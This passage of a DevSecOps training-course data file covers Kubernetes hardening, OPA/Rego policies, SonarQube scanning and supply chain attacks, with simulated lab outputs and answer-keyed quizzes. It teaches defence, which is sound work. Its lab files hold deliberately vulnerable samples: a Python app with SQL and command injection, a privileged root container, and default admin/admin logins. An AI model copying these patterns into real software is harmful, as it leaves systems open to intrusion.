        ]},
        { heading: 'NetworkPolicies', blocks: [
          { type: 'text', content: 'By default, all pods can talk to all pods. NetworkPolicies restrict traffic with ingress/egress rules per namespace and pod label.' },
          { type: 'attack-flow', steps: [
            { type: 'attack', label: 'No NetworkPolicy', detail: 'Attacker compromises one pod and can freely communicate with every other pod in the cluster' },
            { type: 'defense', label: 'Default-Deny Policy', detail: 'Apply a default-deny policy to block all traffic, then explicitly allow only what is needed' },
            { type: 'defense', label: 'Allow Specific Traffic', detail: 'Create policies allowing frontend → backend, backend → database, nothing else' },
            { type: 'info', label: 'Result', detail: 'Blast radius reduced — compromised pod is isolated and cannot reach other services' },
          ]},
          { type: 'callout', variant: 'warning', title: 'CNI Requirement', content: 'NetworkPolicies require a CNI plugin that supports them (Calico, Cilium, Weave). The default kubenet CNI does NOT enforce NetworkPolicies — they are silently ignored.' },
        ]},
        { heading: 'Admission Controllers', blocks: [
          { type: 'text', content: 'Admission controllers intercept requests to the K8s API before persistence. Policy engines evaluate every resource creation/update against your security rules.' },
          { type: 'comparison', items: [
            { title: 'OPA Gatekeeper', color: '#3B82F6', points: [
              'Rego policy language (powerful, steep learning curve)',
              'ConstraintTemplates + Constraints model',
              'Strong ecosystem and community',
              'General-purpose — works beyond K8s too',
            ]},
            { title: 'Kyverno', color: '#A78BFA', points: [
              'YAML-native policies (easier to learn)',
              'Can mutate, validate, and generate resources',
              'K8s-native design and CRDs',
              'Lower barrier to entry for K8s teams',
            ]},
          ]},
        ]},
        { heading: 'CIS Benchmarks', blocks: [
          { type: 'text', content: 'CIS Kubernetes Benchmark provides a comprehensive security configuration guide. Automated tools check your cluster against these benchmarks.' },
          { type: 'scan-output', tool: 'kube-bench', title: 'CIS Benchmark Scan', findings: [
            { type: 'header', text: 'kube-bench run --targets master' },
            { type: 'finding', text: '1.1.1 Ensure API server --anonymous-auth is set to false', severity: 'CRITICAL' },
            { type: 'finding', text: '1.2.6 Ensure --kubelet-certificate-authority is set', severity: 'HIGH' },
            { type: 'finding', text: '1.3.2 Ensure --profiling is set to false', severity: 'MEDIUM' },
            { type: 'summary', text: '47 checks: 38 PASS, 6 FAIL, 3 WARN' },
          ]},
          { type: 'severity-bars', title: 'CIS Benchmark Results', items: [
            { rank: 1, label: 'PASS', count: 38, color: '#22C55E' },
            { rank: 2, label: 'FAIL', count: 6, color: '#EF4444' },
            { rank: 3, label: 'WARN', count: 3, color: '#F59E0B' },
          ]},
        ]},
      ],
    },
    simulation: {
      title: 'Lock Down Kubernetes',
      scenario: 'You have a Kubernetes cluster with a vulnerable deployment. Audit it, find the issues, and fix them.',
      files: {
        'k8s-lab/': {
          'insecure-deploy.yaml': 'apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: vulnerable-app\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: vulnerable-app\n  template:\n    metadata:\n      labels:\n        app: vulnerable-app\n    spec:\n      containers:\n      - name: app\n        image: nginx:latest\n        securityContext:\n          privileged: true\n          runAsUser: 0\n        ports:\n        - containerPort: 80',
          'secure-deploy.yaml': 'apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: secure-app\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: secure-app\n  template:\n    metadata:\n      labels:\n        app: secure-app\n    spec:\n      securityContext:\n        runAsNonRoot: true\n        runAsUser: 1000\n        fsGroup: 1000\n      containers:\n      - name: app\n        image: nginx:1.25-alpine\n        securityContext:\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n          capabilities:\n            drop: ["ALL"]\n        resources:\n          limits:\n            memory: "128Mi"\n            cpu: "250m"\n        ports:\n        - containerPort: 80',
          'networkpolicy.yaml': 'apiVersion: networking.k8s.io/v1\nkind: NetworkPolicy\nmetadata:\n  name: deny-all\nspec:\n  podSelector: {}\n  policyTypes:\n  - Ingress\n  - Egress',
        },
      },
      steps: [
        { objective: 'Create a local Kubernetes cluster', command: 'kind create cluster --name secops-lab', output: 'Creating cluster "secops-lab" ...\n ✓ Ensuring node image\n ✓ Preparing nodes\n ✓ Writing configuration\n ✓ Starting control-plane\n ✓ Installing CNI\n ✓ Installing StorageClass\nSet kubectl context to "kind-secops-lab"', followUp: 'What context was kubectl set to?', answer: 'kind-secops-lab', hint: 'Last line of the output' },
        { objective: 'Deploy the insecure application', command: 'kubectl apply -f insecure-deploy.yaml', output: 'deployment.apps/vulnerable-app created', followUp: 'What is the name of the deployed app?', answer: 'vulnerable-app', hint: 'Check the deployment name in the output' },
        { objective: 'Audit the deployment with kubeaudit', command: 'kubeaudit all -f insecure-deploy.yaml', output: 'CRITICAL  image "nginx:latest" uses latest tag\nCRITICAL  container "app" is privileged\nCRITICAL  container "app" runs as root (UID 0)\nERROR     container "app" has no resource limits\nERROR     container "app" allows privilege escalation\nWARNING   container "app" has readOnlyRootFilesystem: false\nWARNING   container "app" does not drop all capabilities\n\n7 findings (3 CRITICAL, 2 ERROR, 2 WARNING)', followUp: 'How many CRITICAL findings did kubeaudit report?', answer: '3', hint: 'Count the CRITICAL lines' },
        { objective: 'Scan the manifest with Checkov', command: 'checkov -f insecure-deploy.yaml', output: 'Check: CKV_K8S_1: "Do not allow containers to run as privileged"\n  FAILED\nCheck: CKV_K8S_6: "Do not allow containers to run with root"\n  FAILED\nCheck: CKV_K8S_12: "Memory limits should be set"\n  FAILED\nCheck: CKV_K8S_13: "CPU limits should be set"\n  FAILED\nCheck: CKV_K8S_14: "Image tag should be fixed"\n  FAILED\n\nPassed: 2, Failed: 5', followUp: 'How many checks failed?', answer: '5', hint: 'Look at the Failed count at the bottom' },
        { objective: 'Deploy the secure version', command: 'kubectl apply -f secure-deploy.yaml', output: 'deployment.apps/secure-app created', followUp: 'What user ID does the secure container run as?', answer: '1000', hint: 'Check runAsUser in secure-deploy.yaml' },
        { objective: 'Apply a default-deny NetworkPolicy', command: 'kubectl apply -f networkpolicy.yaml', output: 'networkpolicy.networking.k8s.io/deny-all created', followUp: 'What does a default-deny NetworkPolicy do?', answer: 'blocks all ingress and egress traffic unless explicitly allowed', hint: 'It blocks all traffic by default, requiring explicit allow rules' },
        { objective: 'Verify the secure deployment passes audit', command: 'kubeaudit all -f secure-deploy.yaml', output: 'No critical or error findings.\n\n0 findings (0 CRITICAL, 0 ERROR, 0 WARNING)', followUp: 'Did the secure deployment pass all checks? (yes/no)', answer: 'yes', hint: '0 findings means clean audit' },
      ],
    },
    execute: {
      intro: 'Set up a local Kubernetes cluster and practice security hardening.',
      commands: [
        { cmd: 'kind create cluster --name secops-lab', desc: 'Create a local K8s cluster with Kind.' },
        { cmd: 'kubectl get nodes', desc: 'Verify the cluster is running.' },
        { cmd: 'kubectl apply -f insecure-deploy.yaml', desc: 'Deploy the insecure app.' },
        { cmd: 'kubeaudit all -f insecure-deploy.yaml', desc: 'Audit the insecure deployment.' },
        { cmd: 'checkov -f insecure-deploy.yaml', desc: 'Scan with Checkov.' },
        { cmd: 'kubectl apply -f secure-deploy.yaml', desc: 'Deploy the secure version.' },
        { cmd: 'kubectl apply -f networkpolicy.yaml', desc: 'Apply default-deny network policy.' },
        { cmd: 'kind delete cluster --name secops-lab', desc: 'Clean up when done.' },
      ],
    },
    verify: ['How many findings does kubeaudit report on your insecure deployment?', 'What K8s version is your Kind cluster running?'],
    quiz: [
      { q: "What are the three Pod Security Standards levels?", opts: ["Low, Medium, High", "Privileged, Baseline, Restricted", "Open, Closed, Locked", "None, Some, All"], answer: 1, explanation: "Privileged (unrestricted), Baseline (prevents known escalations), Restricted (heavily hardened). Applied via namespace labels." },
      { q: "What does a default-deny NetworkPolicy do?", opts: ["Allows all traffic", "Blocks all traffic unless explicitly allowed by other policies", "Deletes all pods", "Disables the network"], answer: 1, explanation: "A default-deny policy blocks all ingress and egress traffic. You then add specific policies to allow only the traffic you need." },
      { q: "Why should containers not run as root?", opts: ["Root is slower", "If an attacker escapes the container, they could gain root on the host", "Kubernetes doesn't support root", "Root uses more memory"], answer: 1, explanation: "Running as root (UID 0) means a container escape could give the attacker root privileges on the host node." },
      { q: "What is RBAC in Kubernetes?", opts: ["A networking protocol", "Role-Based Access Control — defines who can do what in the cluster", "A container runtime", "A deployment strategy"], answer: 1, explanation: "RBAC lets you define roles with specific permissions and bind them to users or service accounts, enforcing least privilege." },
      { q: "What does 'drop ALL capabilities' mean in a security context?", opts: ["Remove all containers", "Remove all Linux kernel capabilities the container inherits by default", "Drop all network connections", "Delete all files"], answer: 1, explanation: "Linux capabilities are fine-grained root privileges. Dropping ALL removes default capabilities like NET_RAW, reducing what an attacker can do if they compromise the container." },
    ],
  },
  '4.3': {
    id: '4.3', pathId: 4, title: 'Policy as Code with OPA', baseXP: 200, estTime: '20-35 min',
    hasSim: true, hasExecute: true, hasVerify: true,
    theory: {
      sections: [
        { heading: 'What is Policy as Code?', blocks: [
          { type: 'text', content: 'Policy as Code means writing security and compliance rules as executable code that can be version-controlled, tested, and automatically enforced. Instead of manual checklists, policies run in CI/CD pipelines.' },
          { type: 'comparison', items: [
            { title: 'Manual Checklists', color: '#EF4444', points: [
              'Rely on human diligence — people forget',
              'Not version-controlled or auditable',
              'Cannot enforce automatically',
              'Scale poorly with team growth',
            ]},
            { title: 'Policy as Code', color: '#22C55E', points: [
              'Automatically enforced — no human error',
              'Version-controlled in Git alongside code',
              'Testable with unit tests and CI',
              'Scales to any team or org size',
            ]},
          ]},
        ]},
        { heading: 'OPA & Rego', blocks: [
          { type: 'text', content: 'Open Policy Agent (OPA) is a general-purpose policy engine. Policies are written in Rego, a declarative query language. OPA takes JSON input, evaluates it against policies, and returns decisions.' },
          { type: 'keyterms', terms: [
            { term: 'OPA', definition: 'Open Policy Agent — a general-purpose policy engine that decouples policy decisions from application logic.' },
            { term: 'Rego', definition: 'Declarative query language for writing OPA policies. Designed for querying nested documents (JSON/YAML).' },
            { term: 'Input', definition: 'JSON data submitted for evaluation — a K8s resource, Terraform plan, API request, etc.' },
            { term: 'Decision', definition: 'The result of policy evaluation — allow/deny with optional messages explaining violations.' },
          ]},
          { type: 'scan-output', tool: 'opa', title: 'Rego Policy Evaluation', findings: [
            { type: 'header', text: 'opa eval --input bad-input.json --data policy.rego' },
            { type: 'finding', text: "Container 'evil-app' uses unapproved image 'ubuntu:latest'", severity: 'HIGH' },
            { type: 'finding', text: "Container 'evil-app' runs as root (UID 0)", severity: 'CRITICAL' },
            { type: 'finding', text: "Container 'evil-app' is privileged", severity: 'CRITICAL' },
            { type: 'summary', text: '3 deny rules fired — pod rejected' },
          ]},
        ]},
        { heading: 'Gatekeeper', blocks: [
          { type: 'text', content: 'OPA Gatekeeper integrates OPA with Kubernetes as an admission controller. It uses ConstraintTemplates and Constraints to enforce policies on cluster resources.' },
          { type: 'pipeline', stages: [
            { label: 'kubectl apply', icon: 'Terminal', desc: 'User submits a resource to the API', security: false, tool: 'kubectl' },
            { label: 'API Server', icon: 'Server', desc: 'Request received by K8s API', security: false, tool: 'kube-apiserver' },
            { label: 'Gatekeeper Webhook', icon: 'Shield', desc: 'Admission webhook intercepts request', security: true, tool: 'OPA Gatekeeper' },
            { label: 'Rego Evaluation', icon: 'Brain', desc: 'Evaluate against ConstraintTemplates', security: true, tool: 'Rego' },
            { label: 'Allow / Deny', icon: 'Check', desc: 'Compliant resources admitted, violations rejected', security: true, tool: 'Decision' },
          ]},
          { type: 'callout', variant: 'key-concept', title: 'Two-Part Model', content: 'ConstraintTemplate defines the policy logic in Rego. Constraint applies that template to specific resources (e.g., all Pods in production namespace). This separation lets you reuse templates across many constraints.' },
        ]},
        { heading: 'Conftest', blocks: [
          { type: 'text', content: 'Conftest uses OPA/Rego to test structured configuration files — Dockerfiles, Kubernetes YAML, Terraform HCL, and CI configs. Run it in CI to catch misconfigurations before deployment.' },
          { type: 'scan-output', tool: 'conftest', title: 'Conftest Dockerfile Scan', findings: [
            { type: 'header', text: 'conftest test Dockerfile --policy dockerfile-policy/' },
            { type: 'finding', text: 'Last USER should not be root', severity: 'HIGH', file: 'Dockerfile' },
            { type: 'finding', text: 'FROM should use specific tag, not latest', severity: 'MEDIUM', file: 'Dockerfile' },
            { type: 'summary', text: '2 tests, 0 passed, 2 failures' },
          ]},
          { type: 'callout', variant: 'tip', title: 'Shift Left with Conftest', content: 'Run conftest in pre-commit hooks or early CI stages. It catches misconfigurations in seconds, long before they reach a cluster.' },
        ]},
        { heading: 'Use Cases', blocks: [
          { type: 'text', content: 'Common policies prevent entire classes of misconfiguration. Each rule codifies a security best practice.' },
          { type: 'steps', steps: [
            { label: 'Approved Base Images', detail: 'Only allow containers from your private registry or a whitelist of trusted images.' },
            { label: 'No Privileged Containers', detail: 'Block any pod spec with securityContext.privileged: true.' },
            { label: 'Required Labels', detail: 'All resources must have owner, team, and environment labels for accountability.' },
            { label: 'Encrypted Storage', detail: 'S3 buckets must have encryption enabled. Deny unencrypted bucket creation.' },
            { label: 'Non-Root USER', detail: 'Dockerfiles must include a USER directive that is not root.' },
            { label: 'Resource Limits', detail: 'All containers must specify CPU and memory limits to prevent resource exhaustion.' },
          ]},
        ]},
      ],
    },
    simulation: {
      title: 'Write Security Policies',
      scenario: 'Write OPA/Rego policies to enforce container security and test them against compliant and non-compliant configurations.',
      files: {
        'opa-lab/': {
          'policy.rego': 'package kubernetes.admission\n\nimport rego.v1\n\napproved_images := ["python:3.12-slim", "node:20-slim", "nginx:1.25", "alpine:3.19"]\n\ndeny contains msg if {\n  input.spec.containers[i].image == img\n  not image_approved(img)\n  msg := sprintf("Container \'%s\' uses unapproved image \'%s\'. Approved: %v", [input.spec.containers[i].name, img, approved_images])\n}\n\ndeny contains msg if {\n  input.spec.containers[i].securityContext.runAsUser == 0\n  msg := sprintf("Container \'%s\' runs as root (UID 0)", [input.spec.containers[i].name])\n}\n\ndeny contains msg if {\n  input.spec.containers[i].securityContext.privileged == true\n  msg := sprintf("Container \'%s\' is privileged", [input.spec.containers[i].name])\n}\n\nimage_approved(img) if {\n  img == approved_images[_]\n}',
          'bad-input.json': '{\n  "spec": {\n    "containers": [{\n      "name": "evil-app",\n      "image": "ubuntu:latest",\n      "securityContext": {\n        "privileged": true,\n        "runAsUser": 0\n      }\n    }]\n  }\n}',
          'good-input.json': '{\n  "spec": {\n    "containers": [{\n      "name": "safe-app",\n      "image": "python:3.12-slim",\n      "securityContext": {\n        "privileged": false,\n        "runAsUser": 1000\n      }\n    }]\n  }\n}',
        },
      },
      steps: [
        { objective: 'Evaluate the policy against a bad pod', command: "opa eval --input bad-input.json --data policy.rego 'data.kubernetes.admission.deny' --format pretty", output: '[\n  "Container \'evil-app\' uses unapproved image \'ubuntu:latest\'. Approved: [python:3.12-slim, node:20-slim, nginx:1.25, alpine:3.19]",\n  "Container \'evil-app\' runs as root (UID 0)",\n  "Container \'evil-app\' is privileged"\n]', followUp: 'How many deny rules fired?', answer: '3', hint: 'Count the messages in the array' },
        { objective: 'Evaluate the policy against a good pod', command: "opa eval --input good-input.json --data policy.rego 'data.kubernetes.admission.deny' --format pretty", output: '[]', followUp: 'What does an empty array mean?', answer: 'no policy violations, the pod is compliant', hint: 'Empty deny set means nothing was denied' },
        { objective: 'Check which image was rejected', command: "opa eval --input bad-input.json --data policy.rego 'data.kubernetes.admission.deny[_]' --format raw", output: 'Container \'evil-app\' uses unapproved image \'ubuntu:latest\'.\nContainer \'evil-app\' runs as root (UID 0)\nContainer \'evil-app\' is privileged', followUp: 'What image was the bad pod trying to use?', answer: 'ubuntu:latest', hint: 'Check the unapproved image message' },
        { objective: 'Test a pipeline policy with Conftest', command: 'conftest test Dockerfile --policy dockerfile-policy/', output: 'FAIL - Dockerfile - Last USER should not be root\nFAIL - Dockerfile - FROM should use specific tag\n\n2 tests, 0 passed, 2 failures', followUp: 'How many policy failures did Conftest find?', answer: '2', hint: 'Check the summary line' },
        { objective: 'View OPA version and capabilities', command: 'opa version', output: 'Version: 0.62.0\nBuild Commit: abc123\nBuild Timestamp: 2024-12-01T00:00:00Z\nBuild Hostname: builder-01\nGo Version: go1.21.5', followUp: 'What language is OPA written in?', answer: 'go', hint: 'Check the Go Version line' },
      ],
    },
    execute: {
      intro: 'Install OPA and write policies to enforce container security.',
      commands: [
        { cmd: 'brew install opa', desc: 'Install OPA (macOS). On Linux: download from GitHub releases.' },
        { cmd: 'opa version', desc: 'Verify installation.' },
        { cmd: "opa eval --input bad-input.json --data policy.rego 'data.kubernetes.admission.deny' --format pretty", desc: 'Test policy against non-compliant input.' },
        { cmd: "opa eval --input good-input.json --data policy.rego 'data.kubernetes.admission.deny' --format pretty", desc: 'Test policy against compliant input.' },
      ],
    },
    verify: ['How many deny rules does your image policy have?', 'What version of OPA are you running?'],
    quiz: [
      { q: "What language are OPA policies written in?", opts: ["Python", "YAML", "Rego", "HCL"], answer: 2, explanation: "Rego is OPA's declarative policy language, designed for querying and asserting conditions over structured data like JSON." },
      { q: "What does an empty deny set mean when evaluating an OPA policy?", opts: ["The policy is broken", "The input is compliant — no violations found", "OPA crashed", "The input was empty"], answer: 1, explanation: "An empty deny set means no deny rules fired, so the input passed all policy checks." },
      { q: "What is OPA Gatekeeper?", opts: ["A password manager", "An OPA integration for Kubernetes admission control", "A firewall", "A container runtime"], answer: 1, explanation: "Gatekeeper runs OPA as a Kubernetes admission controller, evaluating policies against every resource creation/update request." },
      { q: "What is Conftest used for?", opts: ["Unit testing code", "Testing structured config files (Dockerfile, K8s YAML, Terraform) against OPA policies", "Performance testing", "Network testing"], answer: 1, explanation: "Conftest applies OPA/Rego policies to configuration files, catching misconfigurations in CI before they reach production." },
      { q: "Why is Policy as Code better than manual security checklists?", opts: ["It's cheaper", "Policies are version-controlled, testable, and automatically enforced — humans forget, code doesn't", "It requires fewer people", "It's faster to write"], answer: 1, explanation: "Code-based policies are consistent, auditable, version-controlled, and automatically enforced. Manual checklists rely on human diligence and don't scale." },
    ],
  },
  '4.4': {
    id: '4.4', pathId: 4, title: 'SonarQube Deep Dive', baseXP: 200, estTime: '20-35 min',
    hasSim: true, hasExecute: true, hasVerify: true,
    theory: {
      sections: [
        { heading: 'SonarQube vs Semgrep', blocks: [
          { type: 'text', content: 'Two popular static analysis tools with different strengths. Choose based on your needs — or use both for complementary coverage.' },
          { type: 'comparison', items: [
            { title: 'SonarQube', color: '#3B82F6', points: [
              'Full-featured platform with web dashboard',
              'Quality gates with pass/fail thresholds',
              'Historical tracking of code health over time',
              'Covers bugs, vulns, smells, duplication, coverage',
              'Best for: long-term code quality management',
            ]},
            { title: 'Semgrep', color: '#A78BFA', points: [
              'Fast CLI-first scanner, lightweight',
              'Custom rules in YAML (easy to write)',
              'Focused on security patterns and misconfigurations',
              'Runs in seconds, great for CI gates',
              'Best for: fast security scanning in CI',
            ]},
          ]},
        ]},
        { heading: 'Quality Profiles & Gates', blocks: [
          { type: 'text', content: 'Quality Profiles define which rules are active for each language. Quality Gates define pass/fail conditions that block merges if thresholds are not met.' },
          { type: 'diagram', variant: 'linear', nodes: [
            { label: 'Code Push', note: 'Developer pushes code or opens PR' },
            { label: 'sonar-scanner', note: 'Analyzes code against Quality Profile rules' },
            { label: 'SonarQube Server', note: 'Processes results and evaluates Quality Gate' },
            { label: 'Quality Gate', note: 'Pass/Fail based on thresholds' },
            { label: 'PR Status', note: 'Block merge if gate fails' },
          ]},
          { type: 'callout', variant: 'example', title: 'Quality Gate Conditions', content: 'Typical gate: 0 new critical bugs, 0 new vulnerabilities, 80%+ coverage on new code, < 3% duplication on new code. Any condition failing blocks the PR.' },
        ]},
        { heading: 'Finding Categories', blocks: [
          { type: 'text', content: 'SonarQube classifies findings into four categories, each representing a different type of code issue.' },
          { type: 'severity-bars', title: 'SonarQube Finding Categories', items: [
            { rank: 1, label: 'Bugs', count: 1, color: '#EF4444' },
            { rank: 2, label: 'Vulnerabilities', count: 2, color: '#F97316' },
            { rank: 3, label: 'Security Hotspots', count: 1, color: '#F59E0B' },
            { rank: 4, label: 'Code Smells', count: 3, color: '#3B82F6' },
          ]},
          { type: 'keyterms', terms: [
            { term: 'Bug', definition: 'Code that is objectively wrong and will produce incorrect results (null dereference, resource leak, off-by-one).' },
            { term: 'Vulnerability', definition: 'Security-sensitive code that is exploitable (SQL injection, XSS, path traversal).' },
            { term: 'Security Hotspot', definition: 'Security-sensitive code that needs manual review to determine if it is actually vulnerable (crypto usage, auth logic).' },
            { term: 'Code Smell', definition: 'Maintainability issue that is not a bug but makes code harder to understand and change (deep nesting, long methods, duplication).' },
          ]},
          { type: 'scan-output', tool: 'sonar-scanner', title: 'SonarQube Analysis Results', findings: [
            { type: 'header', text: 'sonar-scanner -Dsonar.login=admin — secops-demo' },
            { type: 'finding', text: 'SQL Injection in get_user() — use parameterized queries', severity: 'CRITICAL', file: 'src/app.py:7' },
            { type: 'finding', text: 'Command Injection in run_command() — validate input', severity: 'CRITICAL', file: 'src/app.py:12' },
            { type: 'finding', text: 'Deeply nested if-statements in process() — refactor', severity: 'MEDIUM', file: 'src/app.py:15' },
            { type: 'summary', text: 'QUALITY GATE: FAILED — 2 critical vulnerabilities, 0% coverage' },
          ]},
        ]},
        { heading: 'CI Integration', blocks: [
          { type: 'text', content: 'Integrate SonarQube via sonar-scanner CLI or build plugins (Maven, Gradle, npm). The scanner sends analysis to the SonarQube server, and results appear on the dashboard.' },
          { type: 'pipeline', stages: [
            { label: 'Code Push', icon: 'GitBranch', desc: 'Developer pushes to feature branch', security: false, tool: 'Git' },
            { label: 'CI Build', icon: 'Server', desc: 'Build and run unit tests', security: false, tool: 'Jenkins / GitHub Actions' },
            { label: 'sonar-scanner', icon: 'Search', desc: 'Analyze code quality and security', security: true, tool: 'SonarQube Scanner' },
            { label: 'Quality Gate', icon: 'Shield', desc: 'Evaluate pass/fail thresholds', security: true, tool: 'SonarQube Server' },
            { label: 'PR Feedback', icon: 'Check', desc: 'Report results on pull request', security: false, tool: 'GitHub / GitLab' },
          ]},
          { type: 'callout', variant: 'tip', title: 'CI Best Practice', content: 'Run sonar-scanner on every PR, not just main branch. Use the Quality Gate status as a required check to block merges that introduce new bugs or vulnerabilities.' },
        ]},
      ],
    },
    simulation: {
      title: 'Code Quality Analysis',
      scenario: 'Analyze a project with SonarQube and understand its dashboard, findings, and quality gates.',
      files: {
        'sonarqube-lab/': {
          'sonar-project.properties': 'sonar.projectKey=secops-demo\nsonar.projectName=SecOps Demo\nsonar.sources=src\nsonar.language=py\nsonar.python.version=3.12',
          'src/app.py': 'import os\nimport sqlite3\n\ndef get_user(user_id):\n    conn = sqlite3.connect("app.db")\n    # SQL Injection vulnerability\n    query = f"SELECT * FROM users WHERE id = {user_id}"\n    result = conn.execute(query)\n    return result.fetchone()\n\ndef run_command(cmd):\n    # Command injection\n    os.system(cmd)\n\ndef process(data):\n    # Code smell: too many nested ifs\n    if data:\n        if data.get("type"):\n            if data["type"] == "admin":\n                if data.get("action"):\n                    if data["action"] == "delete":\n                        return True\n    return False',
        },
      },
      steps: [
        { objective: 'View the SonarQube project configuration', command: 'cat sonar-project.properties', output: 'sonar.projectKey=secops-demo\nsonar.projectName=SecOps Demo\nsonar.sources=src\nsonar.language=py\nsonar.python.version=3.12', followUp: 'What is the project key?', answer: 'secops-demo', hint: 'Check sonar.projectKey' },
        { objective: 'Understand SonarQube findings categories', command: 'sonar-scanner -Dsonar.login=admin', output: 'INFO: Analysis complete\nINFO: QUALITY GATE STATUS: FAILED\n\nBugs:               1\nVulnerabilities:    2 (1 Critical, 1 High)\nSecurity Hotspots:  1\nCode Smells:        3\nCoverage:           0.0%\nDuplication:        0.0%', followUp: 'Did the project pass the quality gate?', answer: 'no', hint: 'Check the QUALITY GATE STATUS' },
        { objective: 'Review the quality gate failure reason', command: 'curl -s localhost:9000/api/qualitygates/project_status?projectKey=secops-demo | python -m json.tool', output: '{\n  "projectStatus": {\n    "status": "ERROR",\n    "conditions": [\n      {"status": "ERROR", "metricKey": "new_reliability_rating", "comparator": "GT", "errorThreshold": "1"},\n      {"status": "ERROR", "metricKey": "new_security_rating", "comparator": "GT", "errorThreshold": "1"}\n    ]\n  }\n}', followUp: 'What two metrics caused the quality gate to fail?', answer: 'new_reliability_rating and new_security_rating', hint: 'Look at the metricKey fields in the conditions' },
      ],
    },
    execute: {
      intro: 'Set up SonarQube locally and scan a project.',
      commands: [
        { cmd: 'docker run -d --name sonarqube -p 9000:9000 sonarqube:community', desc: 'Start SonarQube (wait ~60s for startup).' },
        { cmd: 'echo "Login at http://localhost:9000 with admin/admin"', desc: 'Access SonarQube web UI.' },
        { cmd: 'sonar-scanner -Dsonar.projectKey=demo -Dsonar.sources=. -Dsonar.host.url=http://localhost:9000 -Dsonar.login=admin -Dsonar.password=admin', desc: 'Run the scanner against your project.' },
      ],
    },
    verify: ['How many Security Hotspots does SonarQube find in your project?', 'What is the quality gate status?'],
    quiz: [
      { q: "What is a SonarQube Quality Gate?", opts: ["A firewall rule", "Pass/fail conditions that block code that doesn't meet quality thresholds", "A code formatting tool", "A deployment gate"], answer: 1, explanation: "Quality Gates define conditions (e.g., 0 new critical bugs, 80% coverage on new code) that must be met for code to pass." },
      { q: "What is the difference between a Bug and a Code Smell?", opts: ["They're the same", "A Bug is objectively wrong code; a Code Smell is a maintainability issue", "Code Smells are worse than Bugs", "Bugs only exist in production"], answer: 1, explanation: "Bugs are code that will produce incorrect results. Code Smells are not bugs but indicate maintainability problems (deep nesting, long methods, duplication)." },
      { q: "What is a Security Hotspot?", opts: ["A critical vulnerability", "Security-sensitive code that needs manual review to determine if it's actually vulnerable", "A firewall alert", "An exposed port"], answer: 1, explanation: "Hotspots highlight code that touches security-sensitive areas (crypto, auth, SQL) but requires a human to determine if the usage is safe or vulnerable." },
      { q: "How does SonarQube differ from Semgrep?", opts: ["They're identical", "SonarQube is a full platform with dashboard and tracking; Semgrep is a fast CLI-first scanner", "SonarQube only works with Java", "Semgrep has a web dashboard"], answer: 1, explanation: "SonarQube provides a complete platform with web UI, historical tracking, and quality gates. Semgrep is optimized for fast, CLI-driven security scanning in CI." },
      { q: "Why integrate SonarQube into CI/CD?", opts: ["For faster builds", "To automatically block PRs that introduce bugs, vulnerabilities, or quality issues", "To replace unit tests", "For deployment automation"], answer: 1, explanation: "CI integration ensures every PR is analyzed against quality gates, preventing new bugs and vulnerabilities from being merged." },
    ],
  },
  '4.5': {
    id: '4.5', pathId: 4, title: 'Supply Chain Security', baseXP: 200, estTime: '20-35 min',
    hasSim: true, hasExecute: true, hasVerify: true,
    theory: {
      sections: [
        { heading: 'Supply Chain Attacks', blocks: [
          { type: 'text', content: 'Supply chain attacks target upstream dependencies and build systems. One compromised component can affect thousands of organizations.' },
          { type: 'attack-flow', steps: [
            { type: 'attack', label: 'SolarWinds (2020)', detail: 'Attackers backdoored the build pipeline, injecting malware into legitimate software updates sent to 18,000+ organizations' },
            { type: 'attack', label: 'Log4Shell (2021)', detail: 'Critical RCE in Log4j, a ubiquitous Java logging library used by millions of applications worldwide' },
            { type: 'attack', label: 'Codecov (2021)', detail: 'Modified bash uploader script to steal environment variables (including CI secrets) from customer builds' },
            { type: 'attack', label: 'ua-parser-js (2021)', detail: 'Popular npm package (8M weekly downloads) hijacked to install cryptominers and password stealers' },
            { type: 'defense', label: 'Defense', detail: 'SBOMs, dependency pinning, image signing, SLSA provenance, and admission controllers to verify supply chain integrity' },
          ]},
          { type: 'callout', variant: 'warning', title: 'Trust Nothing', content: 'Your software is only as secure as its weakest dependency. A single compromised library in your transitive dependency tree can give attackers full access.' },
        ]},
        { heading: 'SBOM — Software Bill of Materials', blocks: [
          { type: 'text', content: 'An SBOM lists every component in your software: direct dependencies, transitive dependencies, OS packages, and libraries. Executive Order 14028 requires SBOMs for US government software.' },
          { type: 'pipeline', stages: [
            { label: 'Build Image', icon: 'Layers', desc: 'Create container image from Dockerfile', security: false, tool: 'Docker' },
            { label: 'Generate SBOM', icon: 'FileCode', desc: 'Scan image and list all components', security: true, tool: 'Trivy / Syft' },
            { label: 'Scan SBOM', icon: 'Search', desc: 'Check components against vuln databases', security: true, tool: 'Trivy / Grype' },
            { label: 'Store SBOM', icon: 'Database', desc: 'Attach SBOM to image as attestation', security: true, tool: 'Cosign / OCI Registry' },
            { label: 'Monitor', icon: 'AlertTriangle', desc: 'Alert when new CVEs affect SBOM components', security: true, tool: 'Dependency-Track' },
          ]},
          { type: 'comparison', items: [
            { title: 'CycloneDX', color: '#3B82F6', points: [
              'OWASP standard (JSON/XML)',
              'Security-focused design',
              'Supports VEX (vulnerability exploitability)',
              'Rich component metadata',
            ]},
            { title: 'SPDX', color: '#A78BFA', points: [
              'Linux Foundation standard',
              'Widely adopted for compliance',
              'ISO/IEC 5962 international standard',
              'Strong license tracking',
            ]},
          ]},
        ]},
        { heading: 'SLSA Framework', blocks: [
          { type: 'text', content: 'Supply-chain Levels for Software Artifacts (SLSA) is a framework for ensuring artifacts were built from the expected source by the expected process.' },
          { type: 'steps', steps: [
            { label: 'SLSA L0 — No Guarantees', detail: 'No security practices. No provenance. No guarantees about build integrity.' },
            { label: 'SLSA L1 — Build Process Documented', detail: 'Build process is defined and produces provenance. Consumers know how the artifact was built.' },
            { label: 'SLSA L2 — Signed Provenance', detail: 'Provenance is signed and generated by a hosted build service. Tamper detection for the build process.' },
            { label: 'SLSA L3 — Hardened Build Platform', detail: 'Build platform is hardened. Non-falsifiable provenance. Strongest supply chain guarantees.' },
          ]},
          { type: 'scan-output', tool: 'slsa-verifier', title: 'SLSA Provenance Verification', findings: [
            { type: 'header', text: 'slsa-verifier verify-artifact app.tar.gz' },
            { type: 'finding', text: 'Provenance signature: VERIFIED', severity: 'INFO' },
            { type: 'finding', text: 'Build platform: GitHub Actions (trusted builder)', severity: 'INFO' },
